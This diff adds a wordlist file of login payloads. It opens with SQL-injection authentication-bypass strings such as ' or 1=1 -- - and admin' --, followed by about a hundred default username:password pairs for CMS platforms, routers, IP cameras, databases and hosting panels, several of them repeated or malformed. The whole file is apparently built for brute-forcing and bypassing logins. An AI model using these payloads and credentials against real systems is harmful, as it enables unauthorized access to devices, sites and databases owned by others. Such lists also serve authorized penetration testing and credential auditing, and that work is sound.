@@ -1,1 +1,111 @@
-
+' or 1=1 -- -+:' or 1=1 -- -+
+' or 'a'='a:' or 'a'='a
+admin' --: admin' --
+' or true--:' or true--
+admin' #:'1234
+'="or':'="or
+' or 1=1 limit 1 -- -+:' or 1=1 limit 1 -- -+
+" or ""=":" or ""="
+admin:admin
+admin:123456
+admin:password
+root:root
+root:1234
+test:test
+guest:guest
+user:user
+administrator:admin
+admin:' or 1=1--
+admin:" or 1=1--
+admin:' or ''='
+admin:" or ""="
+joomla:admin
+drupal:admin
+prestashop:prestashop_demo
+opencart:admin
+vbulletin:admin
+phpbb:admin
+mybb:admin
+smf:admin
+tplink:admin
+dlink:admin
+zte:user
+zte:admin
+huawei:admin
+fiberhome:admin
+mikrotik:admin
+ubnt:ubnt
+netgear:password
+netgear:1234
+asus:admin
+belkin:admin
+cisco:cisco
+linksys:admin
+phpmyadmin:root
+cpanel:admin
+plesk:setup
+vestacp:vesta
+webmin:admin
+synology:admin
+qnap:admin
+openwrt:admin
+ddwrt:admin
+reolink:admin
+hikvision:12345
+hikvision:admin
+dahua:admin
+uniview:admin
+ftp:ftp
+anonymous:anonymous
+postgres:postgres
+mysql:root
+mariadb:root
+oracle:oracle
+elasticsearch:changeme
+kibana:kibana
+redis:redis
+rabbitmq:guest
+memcached:memcached
+admin:admin
+admin:1234
+admin:12345
+admin:123456
+admin:password
+admin:admin123
+admin:Admin@123
+admin:qwerty
+admin:qwerty123
+admin:1111
+admin:0000
+admin:2023
+admin:2024
+admin:2025
+admin:admin2023
+admin:admin2024
+admin:admin2025
+admin:pass@123
+root:root
+root:admin
+root:123456
+root:toor
+administrator:administrator
+administrator:admin
+test:test
+guest:guest
+user:user
+wordpress:admin
+wordpress:password
+joomla:admin
+prestashop:prestashop_demo
+opencart:admin
+vBulletin:admin
+phpBB:admin
+tplink:admin
+dlink:admin
+zte:user
+zte:admin
+huawei:admin
+fiberhome:admin
+mikrotik:
+phpmyadmin:root
+cpanel:admin
